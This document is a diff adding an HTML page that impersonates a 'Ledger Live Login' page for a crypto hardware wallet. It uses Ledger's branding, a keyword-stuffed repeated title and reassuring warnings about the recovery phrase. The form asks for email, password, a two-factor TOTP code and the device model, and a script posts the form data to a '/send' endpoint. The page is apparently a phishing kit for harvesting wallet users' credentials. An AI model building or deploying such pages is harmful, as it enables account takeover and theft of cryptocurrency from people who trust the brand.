@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ledger Live Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+
+    .container {
+      margin-top: 30px;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      width: 380px;
+      padding: 25px 30px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    p.desc {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .checkbox-group {
+      margin: 12px 0;
+      font-size: 13px;
+      color: #333;
+    }
+
+    .checkbox-group input {
+      margin-right: 5px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #0f172a;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-size: 15px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .btn:hover {
+      background: #1e293b;
+    }
+
+    .or-text {
+      text-align: center;
+      margin: 12px 0;
+      font-size: 13px;
+      color: #888;
+    }
+
+    .links {
+      text-align: center;
+      font-size: 13px;
+      margin-top: 10px;
+    }
+
+    .links a {
+      margin: 0 5px;
+      color: #2563eb;
+      text-decoration: none;
+    }
+
+    .important-box {
+      background: #fff8e1;
+      border: 1px solid #facc15;
+      border-radius: 5px;
+      padding: 12px;
+      font-size: 13px;
+      margin-top: 15px;
+      color: #555;
+    }
+
+    .important-box strong {
+      display: block;
+      margin-bottom: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Ledger® Live: Login | Getting Started™ with Ledger®</h2>
+    <p class="desc">Securely access your portfolio with Ledger® hardware. <strong>Never enter your 24-word recovery phrase here or anywhere online.</strong></p>
+    
+    <form id="form">
+      <input type="email" placeholder="Please provide your Email" required>
+      <input type="password" placeholder="Password (Minimum 8 characters)" required>
+      <input type="text" placeholder="Two-Factor Code (TOTP)" required>
+      
+      <select name="Device" required>
+        <option>Select your device</option>
+        <option>Ledger Nano X</option>
+        <option>Ledger Nano S</option>
+      </select>
+      
+      <label class="checkbox-group">
+        <input type="radio" name="method"> USB
+      </label>
+      <label class="checkbox-group">
+        <input type="radio" name="method"> Bluetooth (Nano X)
+      </label>
+      
+      <label class="checkbox-group">
+        <input type="checkbox" name="Remember"> Remember this device
+      </label>
+      
+      <label class="checkbox-group">
+        <input type="checkbox" name="Terms"> I agree to the Terms and confirm I will never share my 24-word recovery phrase.
+      </label>
+      
+      <button class="btn">Continue to Ledger® Live</button>
+      
+      <div class="or-text">or</div>
+      
+      <button type="submit" class="btn" style="background:#f1f5f9; color:#000;">Ledger® Live: Login | Getting Started™ with Ledger®</button>
+      
+      <div class="links">
+        <a href="#">Trouble connecting?</a> | 
+        <a href="#">Forgot password</a> | 
+        <a href="#">Download Ledger Live</a>
+      </div>
+      
+      <div class="important-box">
+        <strong>Important:</strong>
+        Ledger will <strong>never</strong> ask for your 24-word recovery phrase, PIN, or private keys on a website or form. Confirm all actions on your physical device.
+      </div>
+    </form>
+  </div>
+  
+  <script>
+  const form = document.getElementById("form");
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const data = Object.fromEntries(new FormData(form)); 
+    
+    const response = await fetch("/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data) 
+    });
+
+    const result = await response.json();
+    alert(result.message);
+  });
+</script>
+
+</body>
+</html>
